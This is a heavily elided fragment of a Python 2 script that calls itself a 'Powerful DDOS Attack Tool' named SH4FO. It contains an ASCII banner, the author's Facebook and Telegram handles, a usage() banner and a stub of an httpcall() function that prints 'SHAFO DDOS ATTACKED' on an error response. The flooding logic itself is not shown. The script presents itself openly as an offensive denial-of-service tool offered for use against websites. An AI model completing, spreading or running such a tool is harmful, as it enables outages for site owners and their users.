...
╚═══╩╝─╚╩╝─╚╩╝──╚═══╝
    ...
    SH4FO  Powerful DDOS Attack Tool // Oo SAFO Oo (Code SHAFO) // Facebook : shaf & Telegram : 7usa_sh4lati
...
def usage():
	...
	print '#  Facebook : Oo SH4FO Oo & Telegram : 7usa_sh4lati #'
	print '####################################################'
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print '\x1b[31;1m SHAFO DDOS ATTACKED'
			code=500
